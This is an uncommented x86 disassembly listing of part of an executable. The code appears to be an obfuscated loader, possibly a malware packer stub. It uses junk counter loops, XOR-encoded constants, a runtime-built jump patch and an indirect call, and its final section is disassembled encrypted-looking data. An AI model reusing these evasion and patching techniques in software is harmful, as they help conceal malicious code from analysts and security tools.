  40e7b1:	inc    edi
  40e7b2:	mov    DWORD PTR ds:0x4345d3,edi
  40e7b8:	jmp    0x40e75d
  40e7bd:	and    DWORD PTR ds:0x43457b,0x0
  40e7c7:	jmp    0x40e7d9
  40e7cc:	mov    edi,DWORD PTR ds:0x43457b
  40e7d2:	inc    edi
  40e7d3:	mov    DWORD PTR ds:0x43457b,edi
  40e7d9:	cmp    DWORD PTR ds:0x43457b,0x11
  40e7e0:	jae    0x40e855
  40e7e6:	cmp    DWORD PTR ds:0x43457b,0x1c
  40e7ed:	jne    0x40e806
  40e7f3:	push   0x43481f
  40e7f8:	push   DWORD PTR [ebp-0x24]
  40e7fb:	push   0x501d
  40e800:	call   DWORD PTR ds:0x413348
  40e806:	jmp    0x40e7cc
  40e80b:	mov    DWORD PTR ds:0x43453b,0x17
  40e815:	cmp    DWORD PTR ds:0x43453b,0x0
  40e81c:	je     0x40e855
  40e822:	cmp    DWORD PTR ds:0x43453b,0x24
  40e829:	jne    0x40e83d
  40e82f:	push   0x3379
  40e834:	push   DWORD PTR [ebp-0x24]
  40e837:	call   DWORD PTR ds:0x4130c8
  40e83d:	mov    ecx,DWORD PTR ds:0x43453b
  40e843:	dec    ecx
  40e844:	mov    DWORD PTR ds:0x43453b,ecx
  40e84a:	jmp    0x40e815
  40e84f:	sub    DWORD PTR ds:0x43458b,edx
  40e855:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  40e85c:	sbb    DWORD PTR ds:0x4345bf,0x434507
  40e866:	lea    eax,[ebp-0x2c]
  40e869:	movzx  ecx,BYTE PTR ds:0x4344f3
  40e870:	and    ecx,DWORD PTR ds:0x4345cf
  40e876:	mov    DWORD PTR ds:0x4344f3,ecx
  40e87c:	mov    DWORD PTR [ebp-0x18],eax
  40e87f:	mov    DWORD PTR ds:0x434547,0x13
  40e889:	cmp    DWORD PTR ds:0x434547,0x0
  40e890:	je     0x40e94f
  40e896:	cmp    DWORD PTR ds:0x434547,0x3
  40e89d:	jne    0x40e8b6
  40e8a3:	push   0x8243
  40e8a8:	push   0x5b51
  40e8ad:	push   DWORD PTR [ebp-0x18]
  40e8b0:	call   DWORD PTR ds:0x4130cc
  40e8b6:	cmp    DWORD PTR ds:0x434547,0x4
  40e8bd:	jne    0x40e8d0
  40e8c3:	mov    esi,DWORD PTR ds:0x434547
  40e8c9:	dec    esi
  40e8ca:	mov    DWORD PTR ds:0x434547,esi
  40e8d0:	xor    esi,esi
  40e8d2:	add    esi,DWORD PTR ds:0x434547
  40e8d8:	dec    esi
  40e8d9:	mov    DWORD PTR ds:0x434547,esi
  40e8df:	jmp    0x40e889
  40e8e4:	and    DWORD PTR ds:0x43457b,0x0
  40e8ee:	jmp    0x40e900
  40e8f3:	mov    edi,DWORD PTR ds:0x43457b
  40e8f9:	inc    edi
  40e8fa:	mov    DWORD PTR ds:0x43457b,edi
  40e900:	cmp    DWORD PTR ds:0x43457b,0x19
  40e907:	jae    0x40e94f
  40e90d:	cmp    DWORD PTR ds:0x43457b,0xd
  40e914:	jne    0x40e92a
  40e91a:	push   0x6845
  40e91f:	push   0x4346f3
  40e924:	call   DWORD PTR ds:0x41334c
  40e92a:	cmp    DWORD PTR ds:0x43457b,0xc
  40e931:	jne    0x40e944
  40e937:	mov    edi,DWORD PTR ds:0x43457b
  40e93d:	inc    edi
  40e93e:	mov    DWORD PTR ds:0x43457b,edi
  40e944:	jmp    0x40e8f3
  40e949:	sub    DWORD PTR ds:0x43453f,edi
  40e94f:	lea    eax,[ebp-0x30]
  40e952:	mov    ecx,DWORD PTR ds:0x434587
  40e958:	adc    DWORD PTR ds:0x4345b7,ecx
  40e95e:	mov    DWORD PTR [ebp-0x14],eax
  40e961:	mov    esi,DWORD PTR ds:0x43451b
  40e967:	xor    ecx,ecx
  40e969:	or     ecx,DWORD PTR ds:0x434557
  40e96f:	sub    esi,ecx
  40e971:	or     esi,DWORD PTR [esi+ecx*1]
  40e974:	mov    eax,ds:0x414afe
  40e979:	mov    ebx,DWORD PTR ds:0x4345b3
  40e97f:	mov    ebx,DWORD PTR [ebx]
  40e981:	sub    DWORD PTR ds:0x4344ff,ebx
  40e987:	mov    eax,DWORD PTR [eax+0x1c8]
  40e98d:	mov    eax,DWORD PTR [eax]
  40e98f:	or     edi,0x2360
  40e995:	mov    ecx,DWORD PTR [ebp-0x14]
  40e998:	mov    esi,0x7510851
  40e99d:	and    DWORD PTR ds:0x434547,0x6472
  40e9a7:	xor    eax,esi
  40e9a9:	sbb    edi,DWORD PTR ds:0x4344fb
  40e9af:	mov    edi,0x327299
  40e9b4:	xor    DWORD PTR ds:0x4344fb,ebx
  40e9ba:	add    eax,edi
  40e9bc:	mov    DWORD PTR [ecx],eax
  40e9be:	mov    eax,ds:0x414dae
  40e9c3:	movzx  ebx,WORD PTR ds:0x4345f7
  40e9ca:	cmp    eax,0x22c02f45
  40e9cf:	mov    eax,DWORD PTR [ebp-0x4]
  40e9d2:	movzx  ebx,BYTE PTR ds:0x4345c7
  40e9d9:	mov    ebx,0xf89c853a
  40e9de:	je     0x40ea1a
  40e9e4:	sub    DWORD PTR ds:0x4345ff,edi
  40e9ea:	mov    ecx,DWORD PTR [ebp-0x24]
  40e9ed:	xor    eax,esi
  40e9ef:	add    eax,edi
  40e9f1:	sbb    DWORD PTR ds:0x434603,0x3fff
  40e9fb:	imul   eax,ecx
  40e9fe:	mov    DWORD PTR ds:0x4344f7,0x22e4
  40ea08:	mov    DWORD PTR [ebp-0x24],eax
  40ea0b:	mov    DWORD PTR ds:0x434547,0x3208
  40ea15:	jmp    0x40eab6
  40ea1a:	add    DWORD PTR ds:0x4345bf,0x154a
  40ea24:	xor    eax,esi
  40ea26:	sbb    DWORD PTR ds:0x434547,0x7bc1
  40ea30:	add    eax,edi
  40ea32:	mov    ds:0x414c12,eax
  40ea37:	movzx  eax,BYTE PTR ds:0x4345bb
  40ea3e:	sub    DWORD PTR ds:0x4345bf,eax
  40ea44:	mov    eax,DWORD PTR [ebp-0x24]
  40ea47:	xor    eax,esi
  40ea49:	adc    DWORD PTR ds:0x43458f,ebx
  40ea4f:	add    eax,edi
  40ea51:	not    ecx
  40ea53:	mov    ds:0x414dae,eax
  40ea58:	mov    eax,DWORD PTR [ebp-0x4]
  40ea5b:	mov    ecx,DWORD PTR ds:0x414c12
  40ea61:	xor    eax,esi
  40ea63:	xor    DWORD PTR ds:0x434503,0x4345c3
  40ea6d:	add    eax,edi
  40ea6f:	mov    DWORD PTR ds:0x43458b,0x4a46
  40ea79:	cmp    ecx,eax
  40ea7b:	jne    0x40eab6
  40ea81:	sbb    DWORD PTR ds:0x434503,0x43454f
  40ea8b:	push   ebx
  40ea8c:	mov    DWORD PTR ds:0x4345bf,0x49e8
  40ea96:	push   DWORD PTR [ebp-0x4]
  40ea99:	sbb    DWORD PTR ds:0x43453f,0x7dd1
  40eaa3:	push   DWORD PTR [ebp-0x24]
  40eaa6:	adc    DWORD PTR ds:0x4344ef,0x434503
  40eab0:	call   DWORD PTR ds:0x414c0a
  40eab6:	and    edx,DWORD PTR ds:0x434503
  40eabc:	mov    eax,ds:0x414afe
  40eac1:	mov    ecx,DWORD PTR ds:0x434593
  40eac7:	and    DWORD PTR ds:0x434543,ecx
  40eacd:	mov    eax,DWORD PTR [eax+0x18c]
  40ead3:	sub    ecx,edx
  40ead5:	mov    eax,DWORD PTR [eax]
  40ead7:	neg    ecx
  40ead9:	mov    DWORD PTR [ebp-0x44],eax
  40eadc:	mov    DWORD PTR [ebp-0x10],ebx
  40eadf:	sub    ecx,DWORD PTR ds:0x43460f
  40eae5:	mov    DWORD PTR [ebp-0x10],ebx
  40eae8:	and    DWORD PTR ds:0x43453f,0x0
  40eaf2:	jmp    0x40eb04
  40eaf7:	mov    ecx,DWORD PTR ds:0x43453f
  40eafd:	inc    ecx
  40eafe:	mov    DWORD PTR ds:0x43453f,ecx
  40eb04:	cmp    DWORD PTR ds:0x43453f,0x1d
  40eb0b:	jae    0x40eb61
  40eb11:	cmp    DWORD PTR ds:0x43453f,0x7
  40eb18:	jne    0x40eb2c
  40eb1e:	push   DWORD PTR [ebp-0x18]
  40eb21:	push   0x7577
  40eb26:	call   DWORD PTR ds:0x4130d0
  40eb2c:	cmp    DWORD PTR ds:0x43453f,0x6
  40eb33:	jne    0x40eb48
  40eb39:	xor    ecx,ecx
  40eb3b:	add    ecx,DWORD PTR ds:0x43453f
  40eb41:	inc    ecx
  40eb42:	mov    DWORD PTR ds:0x43453f,ecx
  40eb48:	jmp    0x40eaf7
  40eb4d:	xor    edx,edx
  40eb4f:	or     edx,DWORD PTR ds:0x434547
  40eb55:	sbb    edx,DWORD PTR ds:0x434607
  40eb5b:	mov    DWORD PTR ds:0x434547,edx
  40eb61:	mov    DWORD PTR [ebp-0x10],ebx
  40eb64:	mov    ecx,DWORD PTR ds:0x43460b
  40eb6a:	or     DWORD PTR ds:0x4345bb,ecx
  40eb70:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  40eb77:	or     eax,edx
  40eb79:	mov    DWORD PTR [ebp-0x10],ebx
  40eb7c:	mov    DWORD PTR [ebp-0x10],0xf89c853e
  40eb83:	xor    ecx,DWORD PTR ds:0x434537
  40eb89:	mov    eax,DWORD PTR [ebp-0x24]
  40eb8c:	and    edx,0x522c
  40eb92:	mov    ecx,DWORD PTR [ebp-0x4]
  40eb95:	and    DWORD PTR ds:0x43460f,edx
  40eb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40eb9e:	or     DWORD PTR ds:0x43460b,0x4345c7
  40eba8:	xor    edx,esi
  40ebaa:	sub    DWORD PTR ds:0x43454f,0x434507
  40ebb4:	xor    ecx,esi
  40ebb6:	adc    DWORD PTR ds:0x4345bf,0x4345fb
  40ebc0:	add    ecx,edx
  40ebc2:	mov    edx,DWORD PTR [ebp-0x4]
  40ebc5:	adc    DWORD PTR ds:0x4344f7,0x434577
  40ebcf:	xor    eax,esi
  40ebd1:	xor    edx,esi
  40ebd3:	adc    DWORD PTR ds:0x4344e3,0x6faf
  40ebdd:	add    eax,edi
  40ebdf:	mov    DWORD PTR ds:0x434583,0x13
  40ebe9:	lea    ecx,[ecx+edx*1+0x9757cb]
  40ebf0:	mov    DWORD PTR ds:0x43453b,0x74ca
  40ebfa:	mov    DWORD PTR [ebp-0x20],eax
  40ebfd:	mov    DWORD PTR ds:0x434543,0x777a
  40ec07:	cmp    eax,ecx
  40ec09:	mov    DWORD PTR ds:0x434613,0x6f86
  40ec13:	ja     0x40ed7b
  40ec19:	jmp    0x40ec27
  40ec1e:	adc    DWORD PTR ds:0x43457b,edi
  40ec24:	mov    eax,DWORD PTR [ebp-0x20]
  40ec27:	add    DWORD PTR ds:0x434603,0x32bd
  40ec31:	mov    ecx,DWORD PTR [ebp-0x4]
  40ec34:	xor    ecx,esi
  40ec36:	xor    DWORD PTR ds:0x4344e7,0x43458f
  40ec40:	lea    eax,[ecx+eax*1+0x327299]
  40ec47:	push   eax
  40ec48:	and    DWORD PTR ds:0x434593,0x0
  40ec52:	xor    eax,eax
  40ec54:	or     eax,DWORD PTR ds:0x434593
  40ec5a:	inc    eax
  40ec5b:	mov    ds:0x434593,eax
  40ec60:	cmp    DWORD PTR ds:0x434593,0x10
  40ec67:	jne    0x40ec76
  40ec6d:	push   DWORD PTR [ebp-0x1c]
  40ec70:	call   DWORD PTR ds:0x413350
  40ec76:	cmp    DWORD PTR ds:0x434593,0xf
  40ec7d:	jne    0x40ec91
  40ec83:	xor    eax,eax
  40ec85:	add    eax,DWORD PTR ds:0x434593
  40ec8b:	inc    eax
  40ec8c:	mov    ds:0x434593,eax
  40ec91:	cmp    DWORD PTR ds:0x434593,0x1c
  40ec98:	jb     0x40ec52
  40ec9e:	movzx  eax,BYTE PTR ds:0x4344e3
  40eca5:	adc    eax,DWORD PTR ds:0x43457b
  40ecab:	mov    ds:0x4344e3,eax
  40ecb0:	mov    eax,DWORD PTR [ebp-0x14]
  40ecb3:	xor    eax,esi
  40ecb5:	mov    DWORD PTR ds:0x43453f,0x3b17
  40ecbf:	lea    eax,[ebp+eax*1+0x3272a1]
  40ecc6:	sub    DWORD PTR ds:0x4345f7,0x434503
  40ecd0:	push   eax
  40ecd1:	and    eax,DWORD PTR ds:0x43457b
  40ecd7:	mov    eax,ds:0x414afe
  40ecdc:	adc    DWORD PTR ds:0x434537,0x7c2
  40ece6:	push   DWORD PTR [eax+0x1bc]
  40ecec:	call   0x4028d7
  40ecf1:	mov    eax,DWORD PTR [ebp-0x4]
  40ecf4:	mov    ecx,DWORD PTR [ebp-0x20]
  40ecf7:	mov    edx,DWORD PTR ds:0x4345fb
  40ecfd:	or     DWORD PTR ds:0x434613,edx
  40ed03:	xor    eax,esi
  40ed05:	lea    eax,[ecx+eax*1+0x327299]
  40ed0c:	mov    ecx,DWORD PTR [ebp-0x4]
  40ed0f:	or     DWORD PTR ds:0x434543,edi
  40ed15:	mov    edx,DWORD PTR [ebp-0x4]
  40ed18:	sub    DWORD PTR ds:0x434577,0x283f
  40ed22:	xor    edx,esi
  40ed24:	xor    DWORD PTR ds:0x4345d3,0x434537
  40ed2e:	xor    ecx,esi
  40ed30:	add    ecx,edx
  40ed32:	mov    edx,DWORD PTR [ebp-0x4]
  40ed35:	and    DWORD PTR ds:0x4345f7,0x4344ff
  40ed3f:	xor    edx,esi
  40ed41:	mov    DWORD PTR ds:0x434537,0x5401
  40ed4b:	lea    ecx,[ecx+edx*1+0x9757cb]
  40ed52:	mov    DWORD PTR ds:0x434507,0x25c8
  40ed5c:	mov    DWORD PTR [ebp-0x20],eax
  40ed5f:	mov    DWORD PTR ds:0x43453f,0x56d4
  40ed69:	cmp    eax,ecx
  40ed6b:	mov    DWORD PTR ds:0x434507,0x74b6
  40ed75:	jbe    0x40ec1e
  40ed7b:	mov    DWORD PTR ds:0x4345ff,0x4be2
  40ed85:	mov    eax,DWORD PTR [ebp+0xc]
  40ed88:	add    DWORD PTR ds:0x434607,edx
  40ed8e:	mov    ds:0x414982,eax
  40ed93:	mov    eax,DWORD PTR [ebp+0x10]
  40ed96:	mov    ds:0x414bd6,eax
  40ed9b:	and    DWORD PTR ds:0x4345c7,0x0
  40eda5:	mov    ecx,DWORD PTR ds:0x4345c7
  40edab:	inc    ecx
  40edac:	mov    DWORD PTR ds:0x4345c7,ecx
  40edb2:	cmp    DWORD PTR ds:0x4345c7,0x1f
  40edb9:	jne    0x40edca
  40edbf:	push   0x43485b
  40edc4:	call   DWORD PTR ds:0x413354
  40edca:	cmp    DWORD PTR ds:0x4345c7,0x13
  40edd1:	jb     0x40eda5
  40edd7:	add    ecx,eax
  40edd9:	mov    eax,ds:0x414982
  40edde:	inc    ecx
  40eddf:	mov    ecx,DWORD PTR [ebp-0x18]
  40ede2:	sub    DWORD PTR ds:0x43454f,0x1b10
  40edec:	push   DWORD PTR [ebp-0x44]
  40edef:	or     DWORD PTR ds:0x4345c3,0x4345f7
  40edf9:	sub    eax,edi
  40edfb:	sub    DWORD PTR ds:0x4344ff,0x4344ef
  40ee05:	push   DWORD PTR [ebp-0x30]
  40ee08:	adc    DWORD PTR ds:0x43453b,0x5064
  40ee12:	xor    eax,esi
  40ee14:	mov    DWORD PTR [ecx],eax
  40ee16:	push   DWORD PTR [ebp-0x2c]
  40ee19:	call   0x40f157
  40ee1e:	sub    eax,edi
  40ee20:	adc    ecx,DWORD PTR ds:0x4344ef
  40ee26:	xor    eax,esi
  40ee28:	mov    DWORD PTR ds:0x4344ff,0x13
  40ee32:	cmp    DWORD PTR ds:0x4344ff,0x0
  40ee39:	je     0x40ee7a
  40ee3f:	cmp    DWORD PTR ds:0x4344ff,0x18
  40ee46:	jne    0x40ee68
  40ee4c:	push   0x43485b
  40ee51:	push   DWORD PTR [ebp-0xc]
  40ee54:	push   DWORD PTR [ebp-0x28]
  40ee57:	push   DWORD PTR [ebp-0x1c]
  40ee5a:	push   DWORD PTR [ebp-0x20]
  40ee5d:	push   0x2408
  40ee62:	call   DWORD PTR ds:0x413358
  40ee68:	mov    ecx,DWORD PTR ds:0x4344ff
  40ee6e:	dec    ecx
  40ee6f:	mov    DWORD PTR ds:0x4344ff,ecx
  40ee75:	jmp    0x40ee32
  40ee7a:	mov    DWORD PTR [ebp+0xc],eax
  40ee7d:	mov    ecx,DWORD PTR [ebp-0x4]
  40ee80:	mov    eax,DWORD PTR [ebp+0xc]
  40ee83:	xor    ecx,esi
  40ee85:	add    ecx,edi
  40ee87:	xor    edx,edx
  40ee89:	div    ecx
  40ee8b:	mov    ecx,DWORD PTR [ebp-0x24]
  40ee8e:	cmp    ecx,eax
  40ee90:	jne    0x40f0b9
  40ee96:	mov    eax,ds:0x414afe
  40ee9b:	mov    DWORD PTR [ebp+0x10],eax
  40ee9e:	mov    eax,ds:0x414c0e
  40eea3:	mov    DWORD PTR [ebp-0x50],eax
  40eea6:	mov    DWORD PTR [ebp-0x18],0xf89c8536
  40eead:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40eeb4:	mov    DWORD PTR [ebp-0x4c],0xf89cb536
  40eebb:	mov    DWORD PTR [ebp-0x64],0xf89f0536
  40eec2:	mov    DWORD PTR [ebp-0x60],0xf89c85f6
  40eec9:	mov    DWORD PTR [ebp-0x54],0xf89c85d6
  40eed0:	mov    eax,DWORD PTR [ebp-0x18]
  40eed3:	xor    eax,esi
  40eed5:	add    eax,edi
  40eed7:	mov    DWORD PTR [ebp-0xc],eax
  40eeda:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  40eee1:	mov    BYTE PTR [ebp-0x25],0x67
  40eee5:	mov    eax,DWORD PTR [ebp-0x18]
  40eee8:	xor    eax,esi
  40eeea:	add    eax,edi
  40eeec:	mov    DWORD PTR [ebp-0xc],eax
  40eeef:	mov    eax,DWORD PTR [ebp-0x54]
  40eef2:	xor    eax,esi
  40eef4:	add    eax,edi
  40eef6:	mov    DWORD PTR [ebp-0x40],eax
  40eef9:	mov    eax,DWORD PTR [ebp-0x4c]
  40eefc:	xor    eax,esi
  40eefe:	add    eax,edi
  40ef00:	mov    DWORD PTR [ebp-0x38],eax
  40ef03:	mov    eax,DWORD PTR [ebp-0x3c]
  40ef06:	xor    eax,esi
  40ef08:	add    eax,edi
  40ef0a:	mov    DWORD PTR [ebp-0x34],eax
  40ef0d:	lea    eax,[ebp-0xa8]
  40ef13:	mov    DWORD PTR [ebp+0xc],eax
  40ef16:	mov    eax,DWORD PTR [ebp-0x18]
  40ef19:	mov    DWORD PTR [ebp-0x14],eax
  40ef1c:	mov    eax,DWORD PTR [ebp-0x20]
  40ef1f:	mov    DWORD PTR [ebp-0x5c],ebx
  40ef22:	mov    DWORD PTR [ebp-0x10],eax
  40ef25:	mov    eax,DWORD PTR [ebp-0x5c]
  40ef28:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef2b:	xor    eax,esi
  40ef2d:	add    eax,0x327299
  40ef32:	mov    DWORD PTR [ecx],eax
  40ef34:	mov    eax,DWORD PTR [ebp-0x14]
  40ef37:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef3a:	xor    eax,esi
  40ef3c:	add    eax,edi
  40ef3e:	mov    DWORD PTR [ecx+0x4],eax
  40ef41:	mov    eax,DWORD PTR [ebp-0x34]
  40ef44:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef47:	mov    DWORD PTR [ecx+0x8],eax
  40ef4a:	mov    eax,DWORD PTR [ebp-0x38]
  40ef4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef50:	mov    DWORD PTR [ecx+0xc],eax
  40ef53:	mov    eax,DWORD PTR [ebp-0x40]
  40ef56:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef59:	mov    DWORD PTR [ecx+0x10],eax
  40ef5c:	mov    eax,eax
  40ef5e:	mov    eax,DWORD PTR [ebp-0x10]
  40ef61:	xor    eax,esi
  40ef63:	add    eax,edi
  40ef65:	je     0x40ef96
  40ef6b:	lea    eax,[ebp-0xa8]
  40ef71:	push   eax
  40ef72:	mov    eax,DWORD PTR [ebp-0x20]
  40ef75:	xor    eax,esi
  40ef77:	add    eax,edi
  40ef79:	push   eax
  40ef7a:	mov    eax,DWORD PTR [ebp+0x10]
  40ef7d:	add    eax,0xaa
  40ef82:	push   eax
  40ef83:	mov    eax,DWORD PTR [ebp+0x10]
  40ef86:	mov    eax,DWORD PTR [eax+0x198]
  40ef8c:	push   DWORD PTR [eax]
  40ef8e:	call   0x411333
  40ef93:	mov    DWORD PTR [ebp-0x8],eax
  40ef96:	cmp    DWORD PTR [ebp-0x8],0x0
  40ef9a:	je     0x40f0b9
  40efa0:	lea    eax,[ebp-0xc]
  40efa3:	mov    DWORD PTR [ebp-0x38],eax
  40efa6:	mov    eax,DWORD PTR [ebp-0x60]
  40efa9:	xor    eax,esi
  40efab:	add    eax,edi
  40efad:	mov    DWORD PTR [ebp-0x40],eax
  40efb0:	mov    eax,DWORD PTR [ebp-0x3c]
  40efb3:	xor    eax,esi
  40efb5:	add    eax,edi
  40efb7:	mov    DWORD PTR [ebp-0x10],eax
  40efba:	mov    eax,DWORD PTR [ebp-0x8]
  40efbd:	mov    DWORD PTR [ebp-0x14],eax
  40efc0:	lea    eax,[ebp-0xa8]
  40efc6:	mov    DWORD PTR [ebp+0xc],eax
  40efc9:	mov    eax,DWORD PTR [ebp-0x18]
  40efcc:	mov    DWORD PTR [ebp-0x18],eax
  40efcf:	mov    eax,DWORD PTR [ebp-0x20]
  40efd2:	mov    DWORD PTR [ebp-0x48],ebx
  40efd5:	mov    DWORD PTR [ebp-0x34],eax
  40efd8:	mov    eax,DWORD PTR [ebp-0x48]
  40efdb:	mov    ecx,DWORD PTR [ebp+0xc]
  40efde:	xor    eax,esi
  40efe0:	add    eax,0x327299
  40efe5:	mov    DWORD PTR [ecx],eax
  40efe7:	mov    eax,DWORD PTR [ebp-0x14]
  40efea:	mov    ecx,DWORD PTR [ebp+0xc]
  40efed:	mov    DWORD PTR [ecx+0x4],eax
  40eff0:	mov    eax,DWORD PTR [ebp-0x10]
  40eff3:	mov    ecx,DWORD PTR [ebp+0xc]
  40eff6:	mov    DWORD PTR [ecx+0x8],eax
  40eff9:	mov    eax,DWORD PTR [ebp-0x40]
  40effc:	mov    ecx,DWORD PTR [ebp+0xc]
  40efff:	mov    DWORD PTR [ecx+0xc],eax
  40f002:	mov    eax,DWORD PTR [ebp-0x38]
  40f005:	mov    ecx,DWORD PTR [ebp+0xc]
  40f008:	mov    DWORD PTR [ecx+0x10],eax
  40f00b:	mov    eax,eax
  40f00d:	mov    eax,DWORD PTR [ebp-0x14]
  40f010:	test   eax,eax
  40f012:	mov    eax,DWORD PTR [ebp-0x34]
  40f015:	jne    0x40f01e
  40f01b:	mov    eax,DWORD PTR [ebp-0x18]
  40f01e:	xor    eax,esi
  40f020:	add    eax,edi
  40f022:	test   eax,eax
  40f024:	je     0x40f052
  40f02a:	lea    eax,[ebp-0xa8]
  40f030:	push   eax
  40f031:	mov    eax,DWORD PTR [ebp-0x20]
  40f034:	xor    eax,esi
  40f036:	add    eax,edi
  40f038:	push   eax
  40f039:	mov    eax,DWORD PTR [ebp+0x10]
  40f03c:	add    eax,0xee
  40f041:	push   eax
  40f042:	mov    eax,DWORD PTR [ebp+0x10]
  40f045:	mov    eax,DWORD PTR [eax+0x198]
  40f04b:	push   DWORD PTR [eax]
  40f04d:	call   0x411333
  40f052:	mov    ecx,DWORD PTR [ebp-0x3c]
  40f055:	xor    ecx,esi
  40f057:	mov    eax,0xffcd8d67
  40f05c:	sub    eax,ecx
  40f05e:	sub    eax,DWORD PTR [ebp-0x8]
  40f061:	mov    ecx,DWORD PTR [ebp-0x50]
  40f064:	add    ecx,eax
  40f066:	mov    eax,DWORD PTR [ebp-0x8]
  40f069:	mov    DWORD PTR [eax+0x1],ecx
  40f06c:	mov    al,BYTE PTR [ebp-0x25]
  40f06f:	mov    ecx,DWORD PTR [ebp-0x8]
  40f072:	xor    al,0x44
  40f074:	sub    al,0x3a
  40f076:	mov    BYTE PTR [ecx],al
  40f078:	lea    eax,[ebp-0x8]
  40f07b:	inc    BYTE PTR [eax]
  40f07d:	inc    eax
  40f07e:	push   eax
  40f07f:	pop    ecx
  40f080:	dec    ecx
  40f081:	xchg   ecx,edx
  40f083:	dec    BYTE PTR [edx]
  40f085:	push   DWORD PTR [ebp+0x10]
  40f088:	mov    eax,ds:0x414bba
  40f08d:	mov    eax,DWORD PTR [eax]
  40f08f:	push   DWORD PTR [eax]
  40f091:	lea    eax,ds:0x414bd6
  40f097:	push   DWORD PTR [eax]
  40f099:	lea    eax,ds:0x414982
  40f09f:	push   DWORD PTR [eax]
  40f0a1:	lea    eax,ds:0x414bb6
  40f0a7:	push   DWORD PTR [eax]
  40f0a9:	lea    eax,ds:0x414cda
  40f0af:	push   DWORD PTR [eax]
  40f0b1:	xchg   ebx,edx
  40f0b3:	inc    ebx
  40f0b4:	push   ebx
  40f0b5:	pop    eax
  40f0b6:	call   DWORD PTR [eax-0x1]
  40f0b9:	lea    eax,[ebp+0x4]
  40f0bc:	mov    DWORD PTR [ebp-0x58],eax
  40f0bf:	mov    eax,ds:0x414afe
  40f0c4:	push   0x4
  40f0c6:	add    eax,0x1cc
  40f0cb:	push   eax
  40f0cc:	lea    eax,[ebp-0x1c]
  40f0cf:	push   eax
  40f0d0:	call   0x4028d7
  40f0d5:	mov    eax,DWORD PTR [ebp-0x1c]
  40f0d8:	mov    eax,DWORD PTR [ebp-0x4]
  40f0db:	mov    eax,DWORD PTR [ebp-0x24]
  40f0de:	mov    DWORD PTR [ebp+0xc],eax
  40f0e1:	mov    eax,ds:0x414b82
  40f0e6:	mov    ecx,DWORD PTR [ebp+0xc]
  40f0e9:	sub    eax,edi
  40f0eb:	xor    eax,esi
  40f0ed:	cmp    eax,ecx
  40f0ef:	je     0x40f136
  40f0f5:	mov    eax,ds:0x414b7a
  40f0fa:	mov    ecx,DWORD PTR [ebp+0xc]
  40f0fd:	sub    eax,edi
  40f0ff:	xor    eax,esi
  40f101:	cmp    eax,ecx
  40f103:	jne    0x40f119
  40f109:	mov    eax,ds:0x414b82
  40f10e:	add    eax,DWORD PTR ds:0x414b7a
  40f114:	jmp    0x40f120
  40f119:	mov    eax,DWORD PTR [ebp+0xc]
  40f11c:	xor    eax,esi
  40f11e:	add    eax,edi
  40f120:	mov    ds:0x414b7a,eax
  40f125:	mov    eax,DWORD PTR [ebp+0xc]
  40f128:	xor    eax,esi
  40f12a:	add    eax,edi
  40f12c:	mov    ds:0x414b82,eax
  40f131:	jmp    0x40f140
  40f136:	mov    eax,ds:0x414b82
  40f13b:	mov    ds:0x414b7a,eax
  40f140:	mov    eax,DWORD PTR [ebp-0x58]
  40f143:	mov    ecx,DWORD PTR ds:0x414b7a
  40f149:	add    DWORD PTR [eax],ecx
  40f14b:	mov    eax,DWORD PTR [ebp-0x1c]
  40f14e:	mov    eax,DWORD PTR [eax]
  40f150:	pop    edi
  40f151:	pop    esi
  40f152:	pop    ebx
  40f153:	leave  
  40f154:	ret    0xc
  40f157:	push   ebp
  40f158:	mov    ebp,esp
  40f15a:	jmp    0x40f4ed
  40f15f:	repz call 0x655e557a
  40f165:	jae    0x40f1d8
  40f167:	hlt    
  40f168:	aaa    
  40f169:	scas   eax,DWORD PTR es:[edi]
  40f16a:	aad    0x84
  40f16c:	pop    ebp
  40f16d:	out    dx,al
  40f16e:	arpl   WORD PTR [eax],sp
  40f170:	mov    dh,0x7e
  40f172:	jle    0x40f168
  40f174:	jns    0x40f1f4
  40f176:	jle    0x40f1f1
  40f178:	and    DWORD PTR [edi],eax
  40f17a:	clc    
  40f17b:	xchg   ebx,eax
  40f17c:	cmp    eax,0x906a34c0
  40f181:	mov    eax,ds:0x5c74b3a1
  40f186:	xchg   ebx,eax
  40f187:	out    dx,al
  40f188:	mov    dh,0x99
  40f18a:	repz ret 0xafa0
  40f18e:	fs stc 
  40f190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f191:	cli    
  40f192:	xor    bl,BYTE PTR [ebx+0x10d4ec8d]
  40f198:	sub    eax,0xea9b2cab
  40f19d:	and    cl,BYTE PTR [eax]
  40f19f:	outs   dx,DWORD PTR ds:[esi]
  40f1a0:	push   ss
  40f1a1:	cmc    
  40f1a2:	jb     0x40f1d5
  40f1a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1a5:	cmp    DWORD PTR [esi+0x28],ecx
  40f1a8:	rcl    BYTE PTR [ecx+0x77010cbc],1
  40f1ae:	pop    edi
  40f1af:	loop   0x40f19d
  40f1b1:	ficom  DWORD PTR [ebp+edi*1-0xcc4e206]
  40f1b8:	repz stc 
  40f1ba:	in     al,dx
  40f1bb:	push   ds
  40f1bc:	jp     0x40f145
  40f1be:	pop    es
  40f1bf:	fs add esi,esp
  40f1c2:	push   ds
  40f1c3:	jp     0x40f154
  40f1c5:	jo     0x40f173
  40f1c7:	fsubr  st(5),st
  40f1c9:	pop    eax
  40f1ca:	imul   ebp,edi,0xffffff94
  40f1cd:	mov    edx,0x191a3115
  40f1d2:	fwait
  40f1d3:	jmp    0xb9d0:0xcab7ac35
  40f1da:	jns    0x40f16e
  40f1dc:	in     eax,dx
  40f1dd:	or     BYTE PTR [eax+0x21],ch
  40f1e0:	sub    cl,bl
  40f1e2:	cmp    BYTE PTR gs:[esi],bl
  40f1e5:	sbb    eax,0x1b0c70e5
  40f1ea:	and    ebx,DWORD PTR [edx-0x68]
  40f1ed:	rcl    DWORD PTR [esi+esi*4],cl
  40f1f0:	test   eax,0xb65da88d
  40f1f5:	xor    BYTE PTR [edi+ecx*1+0xc],cl
  40f1f9:	(bad)  
  40f1fb:	dec    edx
